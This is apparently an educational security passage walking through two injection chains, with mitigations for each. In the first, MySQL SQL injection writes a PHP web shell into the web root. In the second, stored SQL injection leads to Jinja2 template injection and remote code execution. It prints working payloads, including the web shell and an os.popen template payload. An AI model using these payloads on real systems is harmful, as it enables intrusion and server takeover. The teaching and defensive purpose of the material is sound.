🔥 Use case 6 — SQL Injection → File Write → OS Command Execution
🏗️ Architecture
User → Web App (PHP) → MySQL → Linux server
The web server runs as:
www-data
Uploads directory is writable.

🔎 Vulnerable Endpoint
$query = "SELECT * FROM products WHERE id = " . $_GET['id'];
Classic SQL injection.

💣 Step 1 — Confirm Injection
Attacker sends:
?id=1 UNION SELECT 1,2,3
Injection confirmed.

💣 Step 2 — Write Web Shell to Disk
MySQL supports writing files via:
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/html/shell.php';

Attacker injects:
1 UNION SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/html/shell.php' --
Database writes file.

Why this works:
	• MySQL runs under system user
	• Has FILE privilege
	• Can write into web root

💣 Step 3 — Remote Code Execution
Attacker accesses:
http://target/shell.php?cmd=id
Server executes OS command.
Now:
SQL Injection → OS Command Execution.

🧠 Why This Chain Works
	1. SQL injection allows arbitrary query execution
	2. Database allows file writes
	3. Web server serves written file
	4. PHP executes injected code
You pivoted from database interpreter → filesystem → PHP interpreter → OS shell.

🛡️ Mitigation
	• Remove FILE privilege from DB user
	• Store uploads outside web root
	• Use least privilege DB accounts
	• Parameterized queries
	• Disable dangerous DB features

🔥 Use case 7 — SQL Injection → Stored XSS → Template Injection
🏗️ Architecture
User → API → PostgreSQL
Admin Dashboard renders comments via server-side template engine like Jinja2

🔎 Step 1 — SQL Injection to Insert Payload
Attacker injects into comment system:
1; INSERT INTO comments (text) VALUES ('{{7*7}}'); --
Now malicious template syntax stored in DB.

🔎 Step 2 — Admin Dashboard Renders Comment
Backend code:
template = f"<div>{comment.text}</div>"
render_template_string(template)
Stored comment becomes part of template source.

💣 Step 3 — SSTI Triggered
When admin views page:
Template evaluates:
{{7*7}}
Returns:
49
Attacker confirms SSTI.

💣 Step 4 — Escalate to RCE
Inject:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
Now:
	• SQL injection allowed payload storage
	• Template injection gives remote code execution
SQL → Template → OS.

🧠 Why This Happens
Because:
	1. SQL injection allowed persistent payload
	2. Application treated database content as template source
	3. Template engine executed attacker-controlled expressions
This is cross-layer interpreter chaining.

🛡️ Mitigation
	• Parameterized queries
	• Never render DB content as template source
	• Use template variables instead
	• Sandbox template engine


🧠 Master Mental Model for All Injection Types
All injection vulnerabilities follow the same law:

1. Application builds a command/query as a string
2. User input is concatenated into it
3. That string is interpreted by another engine
4. Engine executes attacker-controlled instructions
The interpreter might be:
	• SQL engine → SQL injection
	• MongoDB engine → NoSQL injection
	• Shell → OS command injection
	• Template engine → SSTI
Same root cause:
Code + Data mixed before interpretation.

